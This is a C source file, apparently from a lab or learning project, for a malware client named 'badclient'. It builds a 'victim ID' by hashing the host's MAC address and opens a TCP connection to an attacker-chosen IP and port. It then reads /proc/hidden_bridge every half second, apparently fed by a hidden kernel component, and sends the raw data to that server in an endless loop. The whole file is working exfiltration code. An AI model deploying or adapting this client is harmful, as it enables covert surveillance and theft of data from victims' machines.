#include "badclient.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <arpa/inet.h>
#include <openssl/sha.h>
#include <sys/ioctl.h>
#include <net/if.h>

// Get MAC address string from sysfs for a given interface
// Example output: "aa:bb:cc:dd:ee:ff\n"
int get_mac_string(const char *ifname, char *mac_str, size_t mac_str_size)
{
    char path[256];
    // Construct the sysfs path using the provided interface name
    snprintf(path, sizeof(path), "/sys/class/net/%s/address", ifname);

    FILE *f = fopen(path, "r");
    if (!f)
    {
        perror("fopen mac sysfs");
        return -1;
    }

    // Read up to mac_str_size - 1 characters from the file into the buffer
    if (!fgets(mac_str, mac_str_size, f))
    {
        perror("fgets mac sysfs");
        fclose(f);
        return -1;
    }

    fclose(f);

    // Calculate the length of the retrieved MAC address string
    size_t len = strlen(mac_str);
    if (len > 0 && mac_str[len - 1] == '\n')
    {
        mac_str[len - 1] = '\0'; // Replace the newline with a null terminator to clean the string
    }

    return 0;
}

// Hash a string with SHA-256 and return hex string.
// Returns 0 on success, -1 on failure.
int hash_string_sha256(const char *input, char *out_hex, size_t out_hex_size)
{
    // Allocate an array to store the raw 32-byte binary SHA-256 hash
    unsigned char hash[SHA256_DIGEST_LENGTH];

    // Ensure the output buffer is large enough for 64 hex chars plus a null terminator
    if (out_hex_size < (SHA256_DIGEST_LENGTH * 2 + 1))
    {
        return -1;
    }

    // input = the MAC, len of MAC, hash = raw binary output after hashing
    SHA256((const unsigned char *)input, strlen(input), hash);

    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++)
    {
        // Converting raw binary data (hash) into a readable hexadecimal string.
        // Format each byte as a 2-character(0x0A, 0x1B, 0xFF) hex string and append it
        snprintf(out_hex + i * 2, 3, "%02X", hash[i]); // out_hex = 0A1BFF\0
    }

    // Add a null terminator at the very end of the constructed hex string
    out_hex[SHA256_DIGEST_LENGTH * 2] = '\0';
    return 0;
}

int main(int argc, char *argv[])
{
    char buffer[BUF_SIZE]; // To store the text we get from kernel
    int fd; // Will hold the id number Linux gives us when we open the file
    int bytes_read; // How many bytes the kernel gave

    char *target_ip = (char *)"127.0.0.1"; // Default ip
    int target_port = 8080; // Default port

    for (int i = 1; i < argc; i++)
    {
        if (strcmp(argv[i], "-ip") == 0)
        {
            target_ip = argv[i + 1];
            i++;
        }
        else if (strcmp(argv[i], "-port") == 0)
        {
            target_port = atoi(argv[i + 1]);
            i++;
        }
    }

    int sock;
    struct sockaddr_in serv_addr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        perror("socket");
        return 1;
    }

    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(target_port);

    if (inet_pton(AF_INET, target_ip, &serv_addr.sin_addr) <= 0)
    {
        perror("inet_pton");
        close(sock);
        return 1;
    }

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    {
        perror("connect");
        close(sock);
        return 1;
    }

    // Build victim ID from MAC (sysfs) + SHA-256 and send it once
    char mac_str[64];
    char victim_id[SHA256_DIGEST_LENGTH * 2 + 1]; // 64 hex chars + '\0'

    if (get_mac_string("enp0s8", mac_str, sizeof(mac_str)) == 0 && hash_string_sha256(mac_str, victim_id, sizeof(victim_id)) == 0)
    {
        // Allocate a buffer large enough for "ID:" prefix plus the hash and newline
        char id_buf[EXTRAS_LEN + SHA256_DIGEST_LENGTH * 2]; // ID:(3), \n(1), \0(1) + 64 = 69 bytes
        snprintf(id_buf, sizeof(id_buf), "ID:%s\n", victim_id);  // Format the final ID message string
        send(sock, id_buf, strlen(id_buf), 0); // Send the formatted ID string
    }
    else
    {
        // Fallback ID if MAC or hash fails
        send(sock, "ID:unknown\n", strlen("ID:unknown\n"), 0);
    }
    
    // Read from /proc and send to server
    while (1)
    {
        fd = open(PROC_FILE, O_RDONLY); // Open /proc/hidden_bridge for reading
        if (fd < 0)
        {
            perror("open");
            continue;
        }

        memset(buffer, 0, sizeof(buffer));

        bytes_read = read(fd, buffer, sizeof(buffer) - 1); // -1 because \0
        if (bytes_read < 0)
        {
            perror("read");
            close(fd);
            continue;
        }

        if (bytes_read > 0) // We got data
        {
            send(sock, buffer, bytes_read, 0); // Send the raw bytes to the server
        }

        close(fd);
        usleep(500000); // 500ms to not hammer /proc
    }

    close(sock);
    return 0;
}